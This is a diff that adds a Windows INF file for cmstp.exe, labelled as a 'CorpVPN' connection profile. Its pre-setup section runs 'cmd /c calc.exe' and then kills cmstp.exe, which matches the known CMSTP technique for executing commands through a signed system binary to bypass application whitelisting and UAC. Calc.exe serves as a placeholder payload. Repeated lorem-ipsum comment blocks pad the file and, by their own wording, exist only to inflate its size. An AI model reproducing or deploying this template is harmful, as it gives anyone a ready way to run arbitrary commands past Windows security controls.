@@ -1,0 +1,76 @@
+[Version]
+Signature=$chicago$
+AdvancedINF=2.5
+ 
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+ 
+[RunPreSetupCommandsSection]
+cmd /c calc.exe
+taskkill /IM cmstp.exe /F
+ 
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+ 
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+ 
+[Strings]
+ServiceName="CorpVPN"
+ShortSvcName="CorpVPN"
+ 
+; ============================================
+; Padding Section - Extra Comments for File Size
+; ============================================
+ 
+; This section contains additional comments to increase file size
+; These comments do not affect the functionality of the INF file
+ 
+; Comment block 1
+; ============================================
+; Lorem ipsum dolor sit amet, consectetur adipiscing elit.
+; Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
+; Ut enim ad minim veniam, quis nostrud exercitation ullamco.
+ 
+; Comment block 2
+; ============================================
+; Duis aute irure dolor in reprehenderit in voluptate velit.
+; Esse cillum dolore eu fugiat nulla pariatur excepteur sint.
+; Occaecat cupidatat non proident sunt in culpa qui officia.
+ 
+; Comment block 3
+; ============================================
+; Deserunt mollit anim id est laborum sed ut persiciatis unde.
+; Omnis iste natus error sit voluptatem accusantium doloremque.
+; Laudantium totam rem aperiam eaque ipsa quae ab illo inventore.
+ 
+; You can repeat these comment blocks as many times as needed
+; to reach your desired file size.
+; ============================================
+; Padding Section - Extra Comments for File Size
+; ============================================
+ 
+; This section contains additional comments to increase file size
+; These comments do not affect the functionality of the INF file
+ 
+; Comment block 1
+; ============================================
+; Lorem ipsum dolor sit amet, consectetur adipiscing elit.
+; Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
+; Ut enim ad minim veniam, quis nostrud exercitation ullamco.
+ 
+; Comment block 2
+; ============================================
+; Duis aute irure dolor in reprehenderit in voluptate velit.
+; Esse cillum dolore eu fugiat nulla pariatur excepteur sint.
+; Occaecat cupidatat non proident sunt in culpa qui officia.
+ 
+; Comment block 3
+; ============================================
+; Deserunt mollit anim id est laborum sed ut persiciatis unde.
+; Omnis iste natus error sit voluptatem accusantium doloremque.
+; Laudantium totam rem aperiam eaque ipsa quae ab illo inventore.
+ 
+; You can repeat these comment blocks as many times as needed
+; to reach your desired file size.
